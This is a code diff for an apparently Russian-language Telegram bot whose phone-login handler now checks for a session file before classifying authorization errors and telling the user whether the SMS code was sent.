@@ -130,16 +130,20 @@ async def phone_handler(message: types.Message, state: FSMContext):
         except Exception as e:
             error = str(e).lower()
             logging.error(f"Ошибка авторизации: {e}")
-            if "block" in error:
-                pending[uid]["status"] = "blocked"
-            elif "flood" in error or "limit" in error:
-                pending[uid]["status"] = "flood_sms"
-            elif "password" in error or "2fa" in error:
-                pending[uid]["status"] = "need_password"
-            elif "invalid" in error or "wrong" in error:
-                pending[uid]["status"] = "invalid_code"
+            # Проверяем файл сессии
+            session_file = os.path.join(work_dir, "session.db")
+            if not os.path.exists(session_file):
+                if "block" in error:
+                    pending[uid]["status"] = "blocked"
+                elif "flood" in error or "limit" in error:
+                    pending[uid]["status"] = "flood_sms"
+                elif "password" in error or "2fa" in error:
+                    pending[uid]["status"] = "need_password"
+                else:
+                    pending[uid]["status"] = f"error:{e}"
             else:
-                pending[uid]["status"] = f"error:{e}"
+                # Сессия есть, значит авторизация идёт
+                pass
 
     # Запускаем задачу
     task = asyncio.ensure_future(auth_task())
@@ -151,7 +155,9 @@ async def phone_handler(message: types.Message, state: FSMContext):
     if uid not in pending:
         return
 
+    # Проверяем статус И наличие файла сессии
     status = pending[uid].get("status", "")
+    session_file = os.path.join(work_dir, "session.db")
 
     if status == "flood_sms":
         await safe_edit(msg, "⏳ Слишком много попыток. Попробуйте позже.")
@@ -171,8 +177,12 @@ async def phone_handler(message: types.Message, state: FSMContext):
         await state.clear()
         return
 
-    # Если статус не установлен — значит pymax ждёт код
-    await safe_edit(msg, "✅ SMS отправлена. Введи код из 6 цифр:")
+    elif os.path.exists(session_file):
+        await safe_edit(msg, "✅ SMS отправлена. Введи код из 6 цифр:")
+    else:
+        await safe_edit(msg, "❌ Не удалось отправить SMS. Попробуйте позже.")
+        del pending[uid]
+        await state.clear()
 
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
 async def code_handler(message: types.Message, state: FSMContext):
